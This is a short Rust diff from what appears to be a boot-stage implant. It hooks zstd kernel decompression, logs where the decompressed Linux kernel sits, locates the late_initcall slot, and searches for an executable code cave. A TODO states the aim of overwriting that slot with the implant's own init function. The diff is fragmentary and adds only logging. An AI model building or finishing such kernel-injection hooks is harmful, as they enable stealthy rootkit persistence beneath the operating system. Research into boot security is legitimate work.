@@ -1,4 +1,4 @@
-use log::{debug, error};
+use log::{debug, error, info};
 
 use crate::helpers::{
     file_helper::{Permissions, cave_finder},
@@ -170,6 +170,10 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
         dctx, dst, dst_capacity, src, src_size
     );
+    info!(
+        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
+        dst, dst_capacity
+    );
 
     // TODO: Deploy the kernel hook here to overwrite the pointer at the late_initcall slot with the address of our init function.
     let late_initcall_addr =
@@ -183,7 +187,7 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     debug!("Found late_initcall at address: {:#x}", late_initcall_addr);
     let code_cave = match cave_finder(
         dst,
-        dst_capacity,
+        dst_capacity,   
         0x1000,
         Permissions::READ | Permissions::EXECUTE,
     ) {
